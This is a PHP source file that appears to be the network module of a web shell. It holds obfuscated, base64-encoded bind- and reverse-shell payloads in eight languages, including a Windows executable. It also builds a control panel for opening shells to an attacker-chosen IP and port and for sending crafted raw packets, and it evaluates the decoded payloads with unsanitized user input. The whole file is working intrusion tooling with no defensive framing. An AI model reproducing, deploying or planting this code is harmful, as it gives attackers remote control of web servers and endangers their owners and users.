<?php
$server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:(isset($_SERVER["HTTP_HOST"])?$_SERVER["HTTP_HOST"]:"");
$remote_addr = isset($_SERVER['REMOTE_ADDR'])? $_SERVER['REMOTE_ADDR']:"";
$default_port = 13123;
$winbinary = (strtolower(substr(php_uname(),0,3))=="win")? "<option>executable</option>":"";

$GLOBALS['resources']['rs_php'] = "7VRNj9s2ED3bv0JRBSyFKrZlFwiwLjeX9lggaAv0kN0KMkWtCEsiy6FqB9397x1+yB8bZzdIg15aGJbIGc6b4czT+/6tatT0m6gxRsH1fH4vTDNsZkx2883qzXdb/5xyraUuNFdSG9Hfk0W6ngI3hREdL1rRCeNMclOITrWCCVPU7QANQeM0MaW+5wYo36tWVpzEUZwFI/oTBjRfrd7galfSfmhbXPHDChoaYyAmjn798eef6N5w3a3f/ZLTq9vk3W8/3Fytgxtt6/lG9HNootcixtiOxq7+CBrettF1xGTfc2Z4ddujfypqwuTQGzKWmFKap39NJ4miwbTGDVYQ27dBONFXuH6c8hb4pfDleTi8X9x5iIMhvxuxSrZ1WLaOeuiZEbIv+F6AAXKlWG/aopZ6e5V6TFHRo9F2doJxzkxf5ynGGZKfWL1lESxKgtgXODMQFUnPI3wFWFK4n0sHFIzmZVeAZFscNXD9J9ckNkwhTxYz97uOZ4nKEqRHL90LY2zCMTRQRA7YI8hWrpiEPUEuGePKHgilotfIVu4wGwwb3BHkaDH0ZcdJmi2yVYr1xzvRu0In9U4Lw0nCsqSbYYfZDi84i29iCzfZNaJFp3pFaV3izFyIHVBth4FR7pTrkOb3RVca1pB4zqrbiLz//Rbuvk3nAumKt9Q69dGTpKoobv0ofbSAohKaoCdNWTMuvTuR9LQuZ3y0j0Aio0V3eutEuRva+cTRw0P0Cf8fA/rTaIO93K5HuAiT8b29MeZCls8+ynzSL+kKtKXUrJXAx3aMOzcRdFvgp612B5MKaKl1+YEs6I1fxEooHmexjtMsf2rcoXF5wejBlKZKS1ZIxXtM3mQIj50XyrmxUa+wy5qDHDSzN8R5HFl/yrlNi8yyOmWD8QvMFs+fyF88sXz2BAtOTzajh0Az+11zWdu2Pjz4lU+XpsepJboMPbR9DeWEpJ5Ah5wtahfB8xkqJX5uZWY18kBg0RdHHF0eyCpojfGVMzMInBxHGRqUiPRIyzOssaBLgKPvI1T2AuDyGcDly4CP5xw9Ie+49Nc63+dP9qG9jnKjWXvGH/Tdi6IV6iCKtRUtT9DGqQLv8T9q25erF3yResF/Vr3gknp9Sq/gf706OwEv6RV8nl7BV9IruKwG8K/pFXxtvYLP0at/LFJvb/4G";
$GLOBALS['resources']['rs_python'] = "rVRtb9owEP6c/IrUnYYtUlNoq010QUJtOlVbWwRM+9B2KDgHiQpOZDst/fc7JykwxNQPmxBJ7sV399w958ODVqFVa5rKFshnL381SSbdQy8xJtfdVmuemqSYcpEtW9OTT6dP1dNNl3mmjKfA18U0V5kArf1M+/oV/5l4AuObdAluHhDiJvYRw8zTCSwWVLCu69gzweYsH2Q5SCr80iUYqwIjmzgrzB9O14PQqkGpfepU7mqZ6ygwhZKe1fIqIlcQxZQ131QYbUu1zA1lHKTIYqCNwsyOPjeYW5YfCZNmsqo/nXmZ5jJawkFApCGocmaB4LN0ATKjmNhBO7bDwJISWJXtGofDm2BlQC3PB6N20Pgw+HnZa5zXVlSdl4PQiXeUel8+kqY2is5Yk3i9baGzkTAPLDTY7C8JpvZs56zkGPVavh2FVSkQz7R93DllPIYSGSmREVunAysBuam880jrUldHdSxShEQV6x1XCmcaKOAaIiUSSkT84NH7Xw/6scmIr/zZIppr63D99fZuGF70RyGrjmGgaR2hbl8emYSnOk4VnfK5yoqcthl787ENFMmOsbbh4EDG9G/zqt02IDCYpVLJP8W2iiiMF8m4RIjfFmMd2kruOohX0+gqQqliw1vu7ppj5EGSJhY9ByNeLJ1Ij7jzAEnAIzV/dutOzlkQdOwKBPP79qMLiy39yUbvJPjuWDvmh1VqED7uUyoNzZmrg2rNePWitdS/mlzfhuN6B/no7uLbZDQehv0bPILAjDVk+dp/dPd9Yp22j0yG4Y9R2L+8HPqYcadozZGhMaXkmJc/4ue225ovUqS6pGcoWOrhKkcsQODCcsvuw4Zl9mbgegFgJ7oh8L6Vehs0JeW9U90gXtcTmZQgDMTY8r3TX4/+vQBkvfR746x33t2ZkgXpIUGrOJQmVSP2ojx7D6X+V5T6v6DU7Dc=";
$GLOBALS['resources']['rs_perl'] = "lZJhb9MwEIY/17/CZF6bSIG0DAmpJhVVmqFqa1PFHQhRiNL0WKylcRS7rKgrvx0ny2gEQoJ8sO5en56zHuXsmbOTpbPmuQP5N1xAmaEznCpVyKHj3HKV7tYvErF11hevX909nmgnAU+D4ZCJ5A4URURIl3wJdCFT14B9IUqFl344c/cKyi1dsIHbW5HFh8lq1KPNvQ5pvVem+Dk3KOJfzQr0Y+vc65Rbh5p27gUztvC9c+xcGfSIiHJvQRWlUGL9PY+3YPZUUvQsimT9GpPZ3cVlNJ37S7vLAu8qYsvQH89soqyHhw0H06pXvR2H79677sA6oA4pXFK1n/qfKepIUBVKFBWLBddRRdE0FkShf8P88WQS2gNN6ejXb/RMNR1vNmXEc5MU9nReTUTj+UfrtLGTcakg19MXrTBOEtBrPJtZ9WKN82yjloxlClmGhzgReQ6Jgs0qN+x+NScKyDFbTqZz23jT9Qz6FAQ3S9sYtRM/DJsEdWAPCdZOT+uTTEgwPYs+FuxXUbFbjea2Os20ahxXuE8ROiLI5Mnoyz+NkrTpBnXHXZ6DimIltK+0pYPE7m8uCW9dNya0QxK34lob+zdtZqNt1GWGRZ+Sxls7asRV0d/N/ZewWhMcKm2m/nuOSH8/AQ==";
$GLOBALS['resources']['rs_ruby'] = "tVb7b9M6FP7Z+SuMN0hzVxLGQ+h2N6vGU0ggqjG4QmQXtc5pYy11gu3QoW387fiVrqXt1ivd66p1es7n8/T52p07SSNFMmI8Af4di2b0I9jBhVK17CXJhKmiGcW0miajR08fn7nPQMC3hgnAoazoGajwWlAPVcGHUwiDIIcxlg09kwESoBrB8fHHZ5+/Dt4enbx6f/wuzqsZp0MJ8XSoaNEJp3LG+KV5TxmfzMKor0QDvfGwlBAAz51FAcPSOOlIJSJtOdV7gNgYv2IlxHDOpJJ9r9TagY8n5jCz0rg1EKvqqw7NGDbHbaRYFcCxSEU8kc2ok2RJ0iVZRiJsYT4N4aLRh46OX3+KS+ATVaTpfoD1MqIvD07Tn8k/Xx7c//P0Yr/75Go36dfpG65gAqLjEVFPB6vsGZmePB98APEdhI2TkG4dWQ1NZTykFGoHpHEtGFeY2DZgWUBZ4h6mFedAFeQZJxY3ggnj9sksHSivlO8FXljjlJoqsCUhnAPF0voZdwic15VQ+OTl8bv0XIGYHgw+7Kdhtjv4+0V2GB54vRYe2DskC3yf4eyv7N7dHGeHdnvodtIdm1c09wamsYuu2/TmPSYxifbIIVlCzQrdaVzq2CeglhMySwyZBAxCVOKZqEzypWlGziAT/d1kBe+rU8a0qKZ1mhKyAvEwY4fmOP4jYWshZpVp6e+ORiasG4aRM7zxRHt1cz0/VFXiR79TRhvRzse8QLcgXzChvWvLNwHNZd6k264jCw31ZcpmvRvLtC5pV6etE7oN/p+mBRtNvXkf11UNvFN2iSDRxSWrLlvzrDJsk+8RPZd7K76ugm3D/l22+L19FiBpc33vNfnN6QW4bMR1BjKmZbWQkUw5K4PWluvhErE9tAS5gdi0o1VqO9DSIrXf9k81x5oC+oAc4TrGsz8ejvF2Loory3pIbsFxyBEcQkvUhhAaa760jIaMu/+byFCb2Tzo1QullS1hSUdYWoJuISkbP1rDTMjLF6nIytBm4kHtoTU0g9rDi4zihUvk4US2d3bdmLCty29MsDmKdpBX3S5r/o1z8Mh10ym3nM4lp353m/8zsHbgkJ82E6WbM/1kJwz58XKTZ8FG8gs=";
$GLOBALS['resources']['rs_node'] = "nVHLbsIwEDwbiX+IcokjIVsqSJVAnPoJPdKHjLNgq46T2g5UQvx7/QgU6ENVcrCyO7Ozu7OUZsK51s4p3UonujXhTU3X0/vZW3rHox0zmW3ZXmfLzMB7Jw3gggupqtfWNBysLUoSCYtE1uAuqT4syh6yzgCrL9GUORN4o22j4KpVSkVKryJAKU8p6FpqakXhEbnB/TSkVcxtGlOTmjkuMH3Ze5Ysy686XlcEPqA4KzKz3XngpBDCpBn+iAK9dWK5nJaH8QgFvvBkvxfhfngHj2B2YPCm09zJRmMbeciSvZEOcB6N7LvPw4oauIPqSedhp6z/0mZeOHqJI/0St4JYV0lNDNiuBlzeQk3niO+eV8yxfHKaJsMhLg+naWK0OH5XBmMGlv9Vdhr6WzVKryBKWgc6Or26ew7J43gEykJ26//s7L+98v8hORqs71Um8aKraZT77yHQbxdAP1iPBnqOBpqNhrl8/AQ=";
$GLOBALS['resources']['rs_gcc'] = "rVJhb9owEP0Mv8JjU+tQj5C006TSVEKFSWgtRMA0TRuKgmPIqcGOYjNBp/732nFgwLRJk/ohyd27l3f2vXObKFUql9euuwSVructKlbu/PLj1aN9o6ZbfwucZuuEoRupEhCt9PYIKoAvT7Ekg/kJtpWu2uZM/glLQR+ZOsY5U6AfF/gxvuag1Q0GXKFVDBybIC6WlNA0LlBThz+/z5xf9ZopSEKJCLxOvaYPuqYa0M3iJCki4Ag0DAtsfg4C3/xSg5YEHi3iFWTboPspGgz7084ez0WhglQJLnGsBOCylzdznN8Uo92S5adkZngw7PZ646g7/FbSZGDviyt1MhndfY4m03G/+0DalsKU4YhcYanL95GhlMxo3P8y6Rs9ciaIhCcmFlhU/Rf4jXTYBhS2MnPgiRbAJzdHTecMSHvjWVamB8q45n0oUxrElLKyc3t/HK1DScMuhExZlqFrRAXnjCqW/OAN4l9V3GSd+5p7lHiHiW8lt7rpCjfYxowUTfvjh2CjWLHqhBMvOH8Xfu3dnneqqoZ0yChy9Y1cmaL30LBnzYRkmJr4uV5jmWRob+fl69tpFrKMLNGf2Sk/sULsEKJnnelp7ggX3sUhstP+5w4MwnA8mo6i6V248xVXw/6rm9UmnNQcx7lpH25E6aT8DyflceIdJq/vpLROPtdfAA==";
$GLOBALS['resources']['rs_java'] = "lVRNb9swDD2nQP+D4JM9BHaTDdjWIsOwYYcBAzosvXXBICuMrdWWBYnOB9L891Gy7LhrLz1Ekcgn8vGRcpaxElHb6ywrJJZtnoqmzvK37989dOvlhax1Y5D95VueyiZ9c/PUpAC97fJCt3klBRMVt5b5y3+MPV5eTLSRW47ALHIkwEYqXgWYRgZ7BLW27K40wNcOP1z4rnSLSyR7zaS9GbtuWzz7mhY9A3J3HDTGT+9On11IjlhKm0q7oMh+S8aFi3TqQn2+3YIxcg2juNtGrplpVZx4nhM0h24zyQ8I9yuWswVTsGP++GH2cb666fxSIRPkpDyuzDhPgmNXygpi8WlxlbAQa0Is0p2RCHE+vZqKHurtm6q1ZTyYXox58n/dKjiKMv62F6BRNopBcoSUVFSkBRcPd4YLoHAe7Jau+lBv6Jgvu+ZSxaSfVAUVyk1hOxFcZW4cfO7Oz0S9Jl5RlkuV2TLyLrmJlweLUKcF4E/TaDB4iKPGporXECUpNj+aHZiv3BKhVKo17G83cbSTKkqcPMcQlf6ijm/ItnNWP3DMllBV7JqJRikQCOvfqss+6s/OEfhCZxtkXDbiAZCVoXfdMfiGDhN9V3NagSqwXCxmYQQm/iksaFYRCjCp5sYCHTz6/mrV92QJhuYppLJ9qpExdoF6tONiUy5c1/pmd/2EygL7n8z8tWQ64aQmrHfNVqPEIxGknrIRr9PLUrDHR/Yyn/ErLKQru3Tqj8zDKD95oEUzYMf2AUz+/oX0JhopAe6TQhd/tQplDe562NJEwR5ETMOThG8FqUWTOwsFk876GbWpI9IncOj5GV24r4p+znCAz1J6Psa1T8+H7VlGv7ziddLv9A8=";
$GLOBALS['resources']['rs_executable'] = "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";

$GLOBALS['module']['network']['id'] = "network";
$GLOBALS['module']['network']['title'] = "Network";
$GLOBALS['module']['network']['js_ontabselected'] = "";
$GLOBALS['module']['network']['content'] = "
<table class='boxtbl'>
<thead>
	<tr><th colspan='2'><p class='boxtitle'>Bind Shell</p></th></tr>
</thead>
<tbody>
	<tr><td style='width:144px'>Server IP</td><td><input type='text' id='bindAddr' value='".$server_addr."' disabled></td></tr>
	<tr><td>Port</td><td><input type='text' id='bindPort' value='".$default_port."' onkeydown=\"trap_enter(event, 'rs_go_bind');\"></td></tr>
</tbody>
<tfoot>
	<tr>
		<td style='width:144px;'>
			<select id='bindLang' class='rsType'>
				".$winbinary."
			</select>
		</td>
		<td><span class='button' onclick=\"rs_go_bind();\" style='width:120px;'>run</span></td>
	</tr>
	<tr><td colspan='2'><pre id='bindResult'>Press ' run ' button and run ' nc server_ip port ' on your computer</pre></td></tr>
</tfoot>
</table>
<br>
<table class='boxtbl'>
<thead>
	<tr><th colspan='2'><p class='boxtitle'>Reverse Shell</p></th></tr>
</thead>
<tbody>
	<tr><td style='width:144px'>Target IP</td><td><input type='text' id='backAddr' value='".$remote_addr."' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>
	<tr><td>Port</td><td><input type='text' id='backPort' value='".$default_port."' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>
</tbody>
<tfoot>
	<tr>
		<td style='width:144px;'>
			<select id='backLang' class='rsType'>
				".$winbinary."
			</select>
		</td>
		<td><span class='button' onclick=\"rs_go('back');\" style='width:120px;'>run</span></td>
	</tr>
	<tr><td colspan='2'><pre id='backResult'>Run ' nc -l -v -p port ' on your computer and press ' run ' button</pre></td></tr>
</tfoot>
</table>
<br>
<table class='boxtbl'>
<thead>
	<tr><th colspan='2'><p class='boxtitle'>Simple Packet Crafter</p></th></tr>
</thead>
<tbody>
	<tr><td style='width:120px'>Host</td><td><input type='text' id='packetHost' value='tcp://".$server_addr."' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
	<tr><td>Start Port</td><td><input type='text' id='packetStartPort' value='80' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
	<tr><td>End Port</td><td><input type='text' id='packetEndPort' value='80' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
	<tr><td>Connection Timeout</td><td><input type='text' id='packetTimeout' value='5' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
	<tr><td>Stream Timeout</td><td><input type='text' id='packetSTimeout' value='5' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
</tbody>
<tfoot>
	<tr><td colspan='2'><textarea id='packetContent' style='height:140px;min-height:140px;'>GET / HTTP/1.1\\r\\n\\r\\n</textarea></td></tr>
	<tr>
		<td>
			<span class='button' onclick=\"packet_go();\" style='width:120px;'>run</span>
		</td>
		<td>You can also press ctrl+enter to submit</td>
	</tr>
	<tr><td colspan='2'><div id='packetResult'></div></td></tr>
</tfoot>
</table>
";


if(isset($p['rsLang']) && isset($p['rsArgs'])){
	$rsLang = $p['rsLang'];
	$rsArgs = $p['rsArgs'];
	$res = "";

	if($rsLang=="php"){
		$code = get_resource("rs_".$rsLang);
		if($code!==false){
			$code = "?><?php \$target = \"".$rsArgs."\"; ?>".$code;
			$res = eval_go($rsLang, $code, "", "");
		}
	}
	else{
		$code = get_resource("rs_".$rsLang);
		if($code!==false){
			$res = eval_go($rsLang, $code, "", $rsArgs);
		}
	}

	if($res===false) $res == "error";
	output(html_safe($res));
}
elseif(isset($p['packetTimeout'])&&isset($p['packetSTimeout'])&&isset($p['packetPort'])&&isset($p['packetTimeout'])&&isset($p['packetContent'])){
	$packetHost = trim($p['packetHost']);
	if(!preg_match("/[a-z0-9]+:\/\/.*/", $packetHost)) $packetHost = "tcp://".$packetHost;

	$packetPort = (int) $p['packetPort'];

	$packetTimeout = (int) $p['packetTimeout'];
	$packetSTimeout = (int) $p['packetSTimeout'];

	$packetContent = $p['packetContent'];
	if(ctype_xdigit($packetContent)) $packetContent = @pack("H*" , $packetContent);
	else{
		$packetContent = str_replace(array("\r","\n"), "", $packetContent);
		$packetContent = str_replace(array("\\r","\\n"), array("\r", "\n"), $packetContent);
	}

	$res = "";


	$sock = fsockopen($packetHost, $packetPort, $errNo, $errStr, $packetTimeout);
	if(!$sock){
		$res .= "<div class='weak'>";
		$res .= html_safe(trim($errStr))." (error ".html_safe(trim($errNo)).")</div>";
	}
	else{
		stream_set_timeout($sock, $packetSTimeout);
		fwrite($sock, $packetContent."\r\n\r\n\x00");
		$counter = 0;
		$maxtry = 1;
		$bin = "";
		do{
			$line = fgets($sock, 1024);
			if(trim($line)=="") $counter++;
			$bin .= $line;
		}while($counter<$maxtry);
		fclose($sock);
		$res .= "<table class='boxtbl'><tr><td><textarea style='height:140px;min-height:140px;'>".html_safe($bin)."</textarea></td></tr>";
		$res .= "<tr><td><textarea style='height:140px;min-height:140px;'>".bin2hex($bin)."</textarea></td></tr></table>";
	}

	output($res);
}

?>